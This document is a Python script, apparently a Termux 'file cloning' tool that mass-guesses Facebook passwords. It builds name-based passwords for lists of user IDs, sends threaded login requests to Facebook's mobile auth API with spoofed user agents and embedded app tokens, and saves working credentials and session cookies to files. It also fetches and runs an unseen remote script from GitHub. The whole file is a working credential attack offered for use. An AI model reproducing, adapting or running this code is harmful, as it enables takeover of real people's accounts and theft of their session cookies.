# This script is written by Ali khan 03074816643
import os,sys,glob,tempfile,string,random,subprocess,platform,uuid,os,shutil,zlib,smtplib,base64,uuid,time,json,re,hashlib
import datetime,subprocess
import zipfile
import marshal
from uuid import uuid4
from time import sleep as sp
#######---------____________#############
def R_UA():
    samsung_models = [
        "SM-G920F|G920FXXU6EVH6",
        "SM-R870|R870XXU1AUH3",
        "SM-J320F|J320FXXU0ARL2",
        "SM-A125F|A125FXXU1BUA4",
        "GT-N7100|N7100XXSFQE1",
        "SM-T561|T561XXU0ARB1",
        "SM-A715F|A715FXXS5BUI1",
        "SM-J320F|I9500XXUEMJ3",
        "SM-M325F|M325FXXU1BUH1",
        "SM-J320F|J320FXXU0ARL2",
        "SM-F916U|F916USQS2JWE4",
    ]
    model_, build = random.choice(samsung_models).rsplit('|')
    os_v = random.randint(4, 13)
    fbav = f"{os_v}.0.{random.randint(111, 999)}.{random.randint(111, 999)}"
    ua = ('[FBAN/FB4A;FBAV/'+str(fbav)+';FBPN/com.facebook.katana;FBLC/bn_BD;FBBV/'+str(random.randint(111111111,999999999))+'[FBAN/FB4A;FBAV/225.0.0.47.118;FBPN/com.facebook.katana;FBLC/pl_PL;FBBV/158425924;FBCR/PLAY;FBMF/LGE;FBBD/lge;FBDV/LM-Q610.FG;FBSV/8.1.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.625,width=1080,height=2034};FB_FW/1;FBRV/159951317;] FBBK/1')
    return ua
#####_____________user agent____########
ugen = []
for agent in range(2000):
    aa = 'Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36;'
    b = random.choice(['6', '7', '8', '9', '10', '11', '12', '13'])
    c = 'en-us; 10; T-Mobile myTouch 3G Slide Build/GRI40)I148V)'
    d = random.choice(['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e = random.randrange(1, 999)
    f = random.choice(['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g = 'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
    h = random.randrange(73, 100)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = 'Mobile Safari/533.1'
    fullagnt = f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(fullagnt)
#####___________UA2__________########
def M4():
    abc = ["A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z"]
    pkgs = random.choice(['com.facebook.katana','com.facebook.mlite','com.facebook.lite','com.facebook.adsmanager','com.facebook.liteh'])
    build = random.choice(abc)+random.choice(abc)+random.choice(abc)
    FBBV = str(random.randint(111111111,999999999))
    FBCR = random.choice(["Jazz","Zong","Mobilink","Ufone"])
    #ios_version = random.choice(["10_0_2","10_1_1","10_2","10_2_1","10_3_1","10_3_2","10_3_3"])>
    ua = random.choice(["[FBAN/FB4A;FBAV/76.0.0.24.67;FBBV/29581442;FBDM/{density=2.0,width=720,height=1184};FBLC/en_US;FBCR/vodafone GR;FBMF/HTC;FBBD/htc;FBPN/com.facebook.katana;FBDV/HTC Desire 816 dual sim;FBSV/5.0.2;FBOP/19;FBCA/armeabi-v7a:armeabi;]","FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097171;FBDM/{density=1.5,width=480,height=800};FBLC/es_ES;FBCR/TIGO;FBMF/Elite 4.0S;FBBD/Elite 4.0S;FBPN/com.facebook.katana;FBDV/Elite 4.0S;FBSV/6.0;nullFBCA/armeabi-v7a:armeabi;]"])
    return ua
#####_______________&&&&&&&&&____#####
try:
    import bs4
    from bs4 import BeautifulSoup as pars
except ModuleNotFoundError:
    os.system('pip install bs4')
except Exception as e:
    print(e)
from concurrent.futures import ThreadPoolExecutor as tpe
import requests
from requests.exceptions import ConnectionError as CE
##______COLORS____ARE________######
pwx=[]
W = '\033[97;1m'
R = '\033[91;1m'
G = '\033[92;1m'
Y = '\033[93;1m'
B = '\033[94;1m'
P = '\033[95;1m'
S = '\033[96;1m'
N = '\x1b[0m'
PURPLE ='\x1b[38;5;46m'
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m'
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
BLACK="\033[1;30m"
EXTRA ='\x1b[38;5;208m'
###########__________defline___________#############
def line():
    print(35*'•')

def p(x):
    print(x)
#__________________ [ Lists Used in Script]______________
id = []
ok = []
cp = []
loop = 0
method=[]
SEX= f"{random.choice(['Liger','METERED','MOBILE.EDGE' ,'MOBILE.HSPA','MOBILE.LTE','MODERATE'])}"
ses = requests.Session()
def logo():
    os.system('clear')
    logo = (f'''\033[1;37m                                 
 \033 db           .88b  d88. 
\03388           88'YbdP`88 
\03388           88  88  88 
\03388           88  88  88 
\03388booo.      88  88  88 
\033Y88888P      YP  YP  YP
 \033[97;1m•••••••••••••••••••••••••••••••••••
 [•] Owner    : MOHA ⚡
 [•] GitHub   : MOH T-S 🪄
 [•] Status   : FREE
 [•] Version  : {B}1.0
\033[1;37m•••••••••••••••••••••••••••••••••••''')
    p(logo)
def clear():
    print('\033[1;32m•••••••••••••••••••••••••••••••••••••••••••••••••')
    os.system("clear")
####_______________________&_______________############
class iAmMain:
    def __init__(self):
        self.gp = "https://b-graph.facebook.com/auth/login"
        self.ap = "https://b-api.facebook.com/auth/login"
    def iAmMenu(self):
        #heck_again()
        logo()
        p(" [1\033[1;37m] File Cloning ")
        p(" [2\033[1;37m] Create File ")
        p(" [3\033[1;37m] Cut Used Files Lines ")
        p(" [4\033[1;37m] Join Facebook group")
        p(" [E\033[1;37m] Exit Tool ")
        line()
        opt1 = input(" [•] Select An Option : ")
        if opt1 == "1":self.file_menu()
        if opt1 == "2":self.m_menu()
        if opt1 == "3":self.dump_menu()
        elif opt1 == "4":Grep().with_names()
        elif opt1 == "5":Join().Whatsapp()
        elif opt1 == "E":exit(" [•] Good Bye !!!!!!! ")
        else:p(" [•] Wrong Select ");sp(2);self.iAmMenu()
########___________________FILE_dump__________#########
    def dump_menu(self):
        os.system("cd && git clone --depth=1 https://github.com/Hannan-404/FILE")
        os.system('cd && cd FILE ;python FILE.py')
########___________________FILE_Menu________############
    def file_menu(self):
        #check_again()
        logo()
        p(" [•] \033[1;37mExample \033[92;1m/sdcard/filename.txt\033[1;37m")
        file = input(" [•] \033[1;37mPut File Path : ")
        try:
            id = open(file,"r").read().splitlines()
            self.method_select(id)
        except FileNotFoundError:
            p(" [•] File Path Incorrect ")
            sp(2);self.file_menu()
        
    def method_select(self,id):
        #check_again()
        logo()
        p(" [1] \033[1;37mMethod 1 ")
        p (" [2] \033[1;37mMethod 2 ")
        #p (" [3] \033[1;37mMethod 3")
        #p (" [4] \033[1;37mMethod 4 ")
        line()
        m_opt = input(" [•] Choose : ")
        if m_opt =='1':
            method.append("i")
            self.password_menu(id)
        if m_opt =='2':
            method.append('ii')
            self.password_menu(id)
        #if m_opt =='3':
            method.append('iii')
            self.password_menu(id)
        #elif m_opt =="4":
            method.append('iiii')
            self.password_menu(id)
        else:p(" [•] Wrong Select ! ");sp(2);self.method_select(id)

    def password_menu(self,id):
        #check_again()
        pwx=[]
        logo()
        max = 20
        p(" [•] Example 1 , 2 , 3  to 20 Max ")
        try:
            plimit = int(input(" [•] Put limit : "))
            if plimit =="":
                plimit = 4
            elif plimit > max:
                p(" [•] Password Limit Should under 20 ");sp(2);self.password_menu()
        except:
            plimit = 4
        logo()
        p(" [•] Enter Passwords :\033[92;1m firstlast First Last etc\033[1;37m")
        line()
        for n in range(plimit):
            pwx.append(input(" [•] Put Password %s : "%(n+1)))
        logo()
        p(" [•] Total Accounts : \033[92;1m%s "%(str(len(id))))
        p(" \033[91;1m[•] Use Airplane mode every 2 minutes \033[97;1m") 
        line()
        with tpe(max_workers=30) as saqi:
            for user in id:
                uid = user.split("|")[0]
                nm = user.split("|")[1]
                if "i" in method:
                    saqi.submit(self.method1,uid,nm,pwx)
                elif "ii" in method:
                    saqi.submit(self.method2,uid,nm,pwx)
                elif "iii" in method:
                    saqi.submit(self.method3,uid,nm,pwx)
                elif "iiii" in method:
                    saqi.submit(self.method4,uid,nm,pwx)
        self.saved_results(ok,cp)
    def saved_results(self,ok,cp):
        line()
        p(" [•] Cloning Has been Completed ")
        p(" [•] Total Ok Accounts : %s "%(len(ok)))
        p(" [•] Total Cp Accounts : %s "%(len(cp)))
        line()
        input(" [•] Press Enter To Go Back ")
        self.iAmMenu()
#####______________mtha1_________________##########
    def method1(self,uid,nm,pwx):
        try:
            global ok , cp , loop
            sys.stdout.write('\r [MOHA-XD🎩] %s | M1 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
            fn = nm.split(' ')[0]
            try:
                ln = nm.split(' ')[1]
            except:
                ln = fn
            for ps in pwx:
                pw = ps.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',nm).replace('name',nm.lower())
                data =  {'adid': str(uuid.uuid4()),
                         'email': uid,
                         'password': pw,
                         'cpl': 'true',
                         'credentials_type': 'password',
                         'error_detail_type': 'button_with_disabled',
                         'source': 'register_api',
                         'format': 'json',
                         'device_id': str(uuid.uuid4()),
                         'family_device_id': str(uuid.uuid4()),
                         'generate_session_cookies': '1',
                         'generate_analytics_claim': '1',
                         'generate_machine_id': '1',
                         'tier': 'regular',
                         'device': 'null',
                         'os_ver': '8.1',
                         'carrier': 'Telenor',
                         'app_id': '350685531728',
                         'app_ver': '918.892.73.972.912',
                         'locale': 'en_US',
                         'advertising_id': str(uuid.uuid4()),
                         'fb_api_req_friendly_name': 'authenticate'}
                headers = {'User-Agent': R_UA(),
                              'Accept-Encoding': 'gzip, deflate',
                              'Accept': '*/*', 'connection': 'keep-alive',
                              'Authorization': 'OAuth 256002347743983|374e60f8b9bb6b8cbb30f78030438895',
                              'x-fb-connection-bandwidth': '25718666',
                              'x-fb-sim-hni': '38280',
                              'x-fb-net-hni': '30369',
                              'X-FB-Connection-Quality': 'GOOD',
                              'X-FB-Connection-Type': 'unknown',
                              'content-encoding': 'gzip,deflate',
                              'content-type': 'application/x-www-form-urlencoded',
                              'x-fb-http-engine': 'Liger',
                              'Content-Length': '566'}
                q = ses.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False,verify=True).json()
                if "session_key" in q:
                    print('\r\033[1;92m[XD-OK] %s | %s \033[1;97m '%(uid,pw))
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                    cok = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={cok};{ckkk}"
                    ok.append(uid)
                    open('/sdcard/MOHA_OK.txt','a').write(uid+'|'+pw+'\n')
                    open('/sdcard/HExX_COOKIES.txt','a').write(uid+'|'+pw+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    print('\r\033[1;91m[XD-CP💔] %s | %s \033[1;97m '%(uid,pw))
                    cp.append(uid)
                    open('/sdcard/MOHA_M1_CP.txt','a').write(uid+'|'+pw+'\n')
                    break
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
            self.method1(uid,nm,pwx)
        except Exception as e:
            self.method1(uid,nm,pwx)
#####_____________method2_________#####
    def method2(self,uid,nm,pwx):
        try:
            global ok , cp , loop
            sys.stdout.write('\r [MOHA-XD] %s | M2 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
            fn = nm.split(' ')[0]
            try:
                ln = nm.split(' ')[1]
            except:
                ln = fn
            for ps in pwx:
                pw = ps.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',nm).replace('name',nm.lower())
                data = {"adid": str(uuid.uuid4()),
                        "format": "json",
                        "device_id": str(uuid.uuid4()),
                        "cpl": "true",
                        "family_device_id": str(uuid.uuid4()),
                        "credentials_type": "device_based_login_password",
                        "error_detail_type": "button_with_disabled",
                        "source": "register_api",
                        "email": uid,
                        "password": pw,
                        "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
                        "generate_session_cookies": "1",
                        "meta_inf_fbmeta": "",
                        "advertiser_id": str(uuid.uuid4()),
                        "currently_logged_in_userid": "0",
                        "locale": "en_US",
                        "client_country_code": "US",
                        "method": "auth.login",
                        "fb_api_req_friendly_name": "authenticate",
                        "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                        "api_key": "882a8490361da98702bf97a021ddc14d"}
                headers = {'User-Agent': R_UA(),
                        'Content-Type': 'application/x-www-form-urlencoded',
                        'Host': 'graph.facebook.com',
                        'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                        'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                        'X-FB-Connection-Type': f'{SEX}',
                        'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                        'X-FB-Connection-Quality': f'{SEX}',
                        'X-Tigon-Is-Retry': 'False',
                        'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                        'x-fb-device-group': '5120',
                        'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                        'X-FB-Request-Analytics-Tags': 'graphservice',
                        'X-FB-HTTP-Engine': 'Liger',
                        'X-FB-Client-IP': 'True',
                        'X-FB-Server-Cluster': 'True',
                        'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
                q = ses.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False,verify=True).json()
                if "session_key" in q:
                    print('\r\033[1;92m[XD-OK] %s | %s \033[1;97m '%(uid,pw))
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                    cok = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={cok};{ckkk}"
                    ok.append(uid)
                    open('/sdcard/HExX_OK.txt','a').write(uid+'|'+pw+'\n')
                    open('/sdcard/HExX_COOKIES.txt','a').write(uid+'|'+pw+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    print('\r\033[1;91m[XD-CP] %s | %s \033[1;97m '%(uid,pw))
                    cp.append(uid)
                    open('/sdcard/HExX_M2_CP.txt','a').write(uid+'|'+pw+'\n')
                    break
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
            self.method2(uid,nm,pwx)
        except Exception as e:
            self.method2(uid,nm,pwx)
#####______________mtha3_________________##########
    def method3(self,uid,nm,pwx):
        try:
            global ok , cp , loop
            sys.stdout.write('\r [HExX-XD] %s | M3 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
            fn = nm.split(' ')[0]
            try:
                ln = nm.split(' ')[1]
            except:
                ln = fn
            for ps in pwx:
                pw = ps.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',nm).replace('name',nm.lower())
                data =  {'adid': str(uuid.uuid4()),
                         'email': uid,
                         'password': pw,
                         'cpl': 'true',
                         'credentials_type': 'password',
                         'error_detail_type': 'button_with_disabled',
                         'source': 'register_api',
                         'format': 'json',
                         'device_id': str(uuid.uuid4()),
                         'family_device_id': str(uuid.uuid4()),
                         'generate_session_cookies': '1',
                         'generate_analytics_claim': '1',
                         'generate_machine_id': '1',
                         'tier': 'regular',
                         'device': 'null',
                         'os_ver': '8.1',
                         'carrier': 'Telenor',
                         'app_id': '350685531728',
                         'app_ver': '918.892.73.972.912',
                         'locale': 'en_US',
                         'advertising_id': str(uuid.uuid4()),
                         'fb_api_req_friendly_name': 'authenticate'}
                headers = {'User-Agent': R_UA(),
                              'Accept-Encoding': 'gzip, deflate',
                              'Accept': '*/*', 'connection': 'keep-alive',
                              'Authorization': 'OAuth 256002347743983|374e60f8b9bb6b8cbb30f78030438895',
                              'x-fb-connection-bandwidth': '25718666',
                              'x-fb-sim-hni': '38280',
                              'x-fb-net-hni': '30369',
                              'X-FB-Connection-Quality': 'GOOD',
                              'X-FB-Connection-Type': 'unknown',
                              'content-encoding': 'gzip,deflate',
                              'content-type': 'application/x-www-form-urlencoded',
                              'x-fb-http-engine': 'Liger',
                              'Content-Length': '566'}
                q = ses.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False,verify=True).json()
                if "session_key" in q:
                    print('\r\033[1;92m[XD-OK] %s | %s \033[1;97m '%(uid,pw))
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                    cok = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={cok};{ckkk}"
                    ok.append(uid)
                    open('/sdcard/HExX_OK.txt','a').write(uid+'|'+pw+'\n')
                    open('/sdcard/HExX_COOKIES.txt','a').write(uid+'|'+pw+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    print('\r\033[1;91m[XD-CP] %s | %s \033[1;97m '%(uid,pw))
                    cp.append(uid)
                    open('/sdcard/HExX_M3_CP.txt','a').write(uid+'|'+pw+'\n')
                    break
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
            self.method3(uid,nm,pwx)
        except Exception as e:
            self.method3(uid,nm,pwx)   
#####_____________method4_________#####
    def method4(self,uid,nm,pwx):
        try:
            global ok , cp , loop
            sys.stdout.write('\r [HExX-XD] %s | M4 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
            fn = nm.split(' ')[0]
            try:
                ln = nm.split(' ')[1]
            except:
                ln = fn
            for ps in pwx:
                pw = ps.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',nm).replace('name',nm.lower())
                data = {"adid": str(uuid.uuid4()),
                        "format": "json",
                        "device_id": str(uuid.uuid4()),
                        "cpl": "true",
                        "family_device_id": str(uuid.uuid4()),
                        "credentials_type": "device_based_login_password",
                        "error_detail_type": "button_with_disabled",
                        "source": "register_api",
                        "email": uid,
                        "password": pw,
                        "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
                        "generate_session_cookies": "1",
                        "meta_inf_fbmeta": "",
                        "advertiser_id": str(uuid.uuid4()),
                        "currently_logged_in_userid": "0",
                        "locale": "en_US",
                        "client_country_code": "US",
                        "method": "auth.login",
                        "fb_api_req_friendly_name": "authenticate",
                        "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                        "api_key": "882a8490361da98702bf97a021ddc14d"}
                headers = {'User-Agent': R_UA(),
                        'Content-Type': 'application/x-www-form-urlencoded',
                        'Host': 'graph.facebook.com',
                        'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                        'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                        'X-FB-Connection-Type': f'{SEX}',
                        'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                        'X-FB-Connection-Quality': f'{SEX}',
                        'X-Tigon-Is-Retry': 'False',
                        'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                        'x-fb-device-group': '5120',
                        'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                        'X-FB-Request-Analytics-Tags': 'graphservice',
                        'X-FB-HTTP-Engine': 'Liger',
                        'X-FB-Client-IP': 'True',
                        'X-FB-Server-Cluster': 'True',
                        'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
                q = ses.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False,verify=True).json()
                if "session_key" in q:
                    print('\r\033[1;92m[XD-OK] %s | %s \033[1;97m '%(uid,pw))
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                    cok = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={cok};{ckkk}"
                    ok.append(uid)
                    open('/sdcard/HExX_OK.txt','a').write(uid+'|'+pw+'\n')
                    open('/sdcard/HExX_COOKIES.txt','a').write(uid+'|'+pw+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    print('\r\033[1;91m[XD-CP] %s | %s \033[1;97m '%(uid,pw))
                    cp.append(uid)
                    open('/sdcard/HExX_M4_CP.txt','a').write(uid+'|'+pw+'\n')
                    break
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
            self.method4(uid,nm,pwx)
        except Exception as e:
            self.method4(uid,nm,pwx)         
#######_________________join________&#########
class Join:
    def Whatsapp(self):
        os.system('xdg-open https://facebook.com/groups/1937425263394282/')
        iAmMain().iAmMenu()
#######___________________Name_____________#######
class Grep:
    def __init__(self):
        self.url = "https://free.facebook.com"
    def with_names(self):
        clear()
        logo()
        lines=[]
        p(" [•] Ex : /sdcard/file.txt")
        try:
            file = input(" [•] Put File Path : ")
        except Exception as e:
            print(" [•] File Path Incorrect!! ");sp(2);self.used_cutter()
        digit= int(input(" [•] Put Line Num :"))
        with open(file,"r") as r:
            lines = r.readlines()
        with open(file,"w") as w:
            for num,line in enumerate(lines):
                if num >= digit:
                    w.write(line)
        p(" [•] File  Complete")
        input(" [•] Press Enter to go back ")
        iAmMain().iAmMenu()
if __name__=="__main__":
    iAmMain().iAmMenu()
##########________END__________#########